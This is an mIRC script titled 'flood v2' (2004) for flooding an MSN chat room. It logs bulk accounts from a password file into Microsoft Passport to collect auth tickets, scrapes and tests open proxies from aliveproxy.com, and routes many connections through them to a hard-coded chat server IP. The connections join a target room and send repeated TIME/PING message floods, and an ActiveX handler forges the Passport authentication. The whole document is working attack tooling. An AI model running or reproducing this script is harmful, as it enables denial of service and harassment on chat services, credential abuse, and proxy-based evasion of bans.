; flood v2 by ajhacksu 'n mister_bolonhas ~ millenares team ~ 29-31 oct 2004

on *:start: i | echo 3 * /us /ps /ss 15/st /zz | .timer 1 0 os
alias i h .a auth.txt | h .a2 auth2.txt | h .u pass.txt | h .p proxy.txt | h .n names.txt | ii
alias ii h h 207.68.167.157:6667 | h r $(%#amizade_2000_,0)
alias h if ((!$isid) || ($2)) $iif($prop,hinc,hadd) -m h $1- | if ($isid) && ($prop != ~) return $hget(h,$1)
alias d var %i $hget(h,0).data | while (%i) { echo 3 -a * $hget(h,%i).item : $hget(h,%i).data | dec %i }
alias s sockwrite -n $1-

; chain updater

alias us echo 3 * updating $iif($1,$1,$lines($h(.u))) passports... | write -c $h(.a) | h u 1 | if ($1) { h ur $1 | h u r } | un
alias -l up {
  var %h $+($iif(*@msn.* iswm $1,msnia),login,$iif(*@hotmail.* iswm $1,net),.passport.com)
  var %a OrgVerb=GET,OrgURL=?,sign-in= $+ $replace($1,@,$(%40,0)) $+ ,pwd= $+ $2 $+ ,id=507 $+ $crlf $+ Host: %h
  sockclose u | sockopen u %h 80 | sockmark u %a
}
alias -l ur return $iif($h(u) == r,$iif($h(ur),$r(1,100) $+ @flood.net flooder),$read($h(.u),$h(u)) $h(u,1).~)
alias -l un h ua 0 | h ul $ur | h ut $ticks | if ($h(ul)) up $v1 | else uw x
alias -l uw if ($1) { hdel -w h u* | echo 3 * all passports ok. } | else write $h(.a) $h(ua)
alias -l ua tokenize 61 $1 | return $+(:,$base($len($1),10,16,8),$1,$base($len($2),10,16,8),$2)
on *:sockopen:u: s u $+(GET /login2.srf HTTP/1.1,$crlf,Authorization: Passport1.4,$sock(u).mark,$crlf,$crlf)
on *:sockread:u: var %x | sockread %x | if (a* iswm %x) h ua $ua($remove($left($token(%x,7-8,61),-4),&p)) $h(ur,-1).~
on *:sockclose:u: echo $iif($h(ua),2 * ok: $uw,4 * err:) $token($h(ul),1,32) in $calc($ticks - $h(ut)) $+ msecs | un

; proxy analyzer

alias ps sockopen p aliveproxy.com 80 | write -c p | echo 2 * connecting to proxy-list site..
on *:sockopen:p: s p $+(GET /irc-proxy-list/ HTTP/1.0,$crlf,$crlf) | echo 2 * connected. getting list...
on *:sockread:p: sockread &x | bwrite p -1 &x
on *:sockclose:p: {
  bread p 0 $file(p) &x | var %i 1 | write -c p
  while ($bfind(&x,%i,w-l)) { %i = $v1 + 29 | write p $bvar(&x,%i,$calc($bfind(&x,%i,<b) - %i)).text }
  echo 3 -a * found $h(tp,$lines(p)) proxies. | h t 0 | tn | write -c $h(.p)
}
alias -l tn if ($read(p,$h(t,1).:)) ts $replace($v1,:,$chr(32)) | else echo 3 * all proxies tested. $te
alias -l ts sockclose t | sockopen t $1- | h tt $ticks | h th $1- | echo 2 * testing $1- / $h(t) of $h(tp) | .timert 1 10 ta 10
alias -l ta echo 4 * aborting $h(th) after $1 $+ secs | sockclose t | tn
alias -l te sockclose t | hdel -w h t* | .timert off | filter -ffcut 2 9 $h(.p) $h(.p) | .remove p
on *:sockopen:t: {
  var %t $calc($ticks - $h(tt)) $+ ms | if ($sockerr) { echo 4 * err: $sock(t).wsmsg after %t | tn | halt }
  s t CONNECT $h(h) HTTP/1.0 $+ $crlf $+ $crlf | echo 2 * conected in %t | .timert 1 15 ta 25
}
on *:sockread:t: {
  var %x, %t $calc($ticks - $h(tt)), %l $calc($ticks - $h(tl)) | sockread %x | ; echo 15 ~ %x
  if (ht* iswm %x) { s t version | echo 2 * conected remote host in %t $+ ms | h tl $ticks }
  if (:t* iswm %x) { echo 3 * $h(th) ok in %t $+ ms, lag: %l $+ ms | write $h(.p) $+($h(th),$chr(9),%t,$chr(9),%l) | tn }
}

; rotative sockwork

alias ss se | h si 0 | h pi 1 | h pl 0 | sn
alias st echo 2 -a * aborting.. | h pi 1 | .timer 1 0 sn
alias -l se sockclose s* | hdel -w h s* | hdel -w h p*
alias -l sn if (2 // $h(pi,1).:) $h(pl,1).~ | if ($read($h(.p),$h(pl))) sp $v1 | else echo 4 * proxy list end
alias -l sp sockclose s | sockopen s $h(p,$token($1-,1,9)) | echo 2 * connecting to $h(p) $+ ...
alias -l so if ($h(si) < $lines($h(.a))) sn | else { echo 3 * all socks ready | editbox -sf / }
on *:sockopen:s: if ($sockerr) echo 4 * err: $sock(s).wsmsg $st | else s s $+(CONNECT $h(h) HTTP/1.0,$crlf,$crlf)
on *:sockread:s: {
  var %x | sockread %x | echo 15 ~ %x
  if (h*     * iswm %x) { h sp $h(sn,$read($h(.n))) * : $lf prop $ msnprofile $token($h(sn),2,32) | s s nick $h(sn) | on }
  if (a* s :g* iswm %x) s o %x
  if (a* s :o* iswm %x) s s auth gatekeeperpassport S $+($read($h(.a),$h(si,1).:),$lf,user $h(sp))
  if (:* 001 * iswm %x) { echo 3 * $h(sn) ok | sockrename s z $+ $lower($base($ticks,10,16)) | so }
  if (:* 910 * iswm %x) sp
}

; room socks

alias zz sockclose z* | oc | socklist

alias zs h z $sock(z*,0) | zn
alias -l zn s $sock(z*,$h(z)) join $h(r) $h(z,1).~

alias jt sockwrite -n z* join $h(r) $+ $str($+($lf,privmsg $h(r) :TIME,$lf,privmsg $h(r) :PING 12),$iif($1,$1,3)) $+ $lf $+ part $h(r)

on *:sockread:z*: {
  var %x | sockread %x | echo 15 $sockname ~ %x
  if (ping* iswm %x) s $sockname $replace(%x,ping,pong)
}

; msnocx handler

alias os window -h @o | var %h $window(@o).hwnd | od select %h $od(attach,%h) | socklisten o~ $of | echo 2 * msnocx initialized.
alias -l oc sockclose o | od navigate about:blank
alias -l od dll nhtmln.dll $1-
alias -l of while (!$portfree($h(o,$r(5000,9999)))) { } | return $h(o)
alias -l on {
  od $oc navigate about:<object classid=clsid:eccdba05-b58f-4509-ae26-cf47b2ffc3fe> $&
    <param name=nickname value=x><param name=server value= $+ $puttok($h(h),$h(o),2,58) ></object>
}
on *:socklisten:o~: sockclose o | sockaccept o
on *:sockread:o: var %x | sockread %x | if (a* iswm %x) op %x
alias -l op s s $1-2 $+ Passport $3 $iif($3 == i,$4,$oc $oº($left($oª($4),-32) $+ $read($h(.a2))))
alias -l oª {
  var %i 1, %r, %j 1, %s, %o
  while (%i <= $len($1-)) { %r = %r $+ $base($asc($mid($1-,%i)),10,16,2) | inc %i }
  while (%j < $len(%r)) {
    %o = $mid(%r,%j,2) | if (%o != 5C) %s = %s $+ %o
    else { inc %j 2 | %s = %s $+ $replace($mid(%r,%j,2),30,00,62,20,63,2C,6E,10,72,13,74,09) } | inc %j 2
  }
  return %s
}
alias -l oº {
  var %i 1, %r, %l $len($1-), %j 1, %s, %c
  while (%i < %l) { %r = %r $+ $replace($mid($1-,%i,2),5C,5C5C,00,5C30,20,5C62,2C,5C63,10,5C6E,13,5C72,09,5C74) | inc %i 2 }
  while (%j <= $len(%r)) { %s = $iif($chr($base($mid(%r,%j,2),16,10)) == $chr(32),%s $v1,%s $+ $v1) | inc %j 2 } | return %s
}

alias jj sockwrite -n $sock(z*,$1) JOIN $h(r)
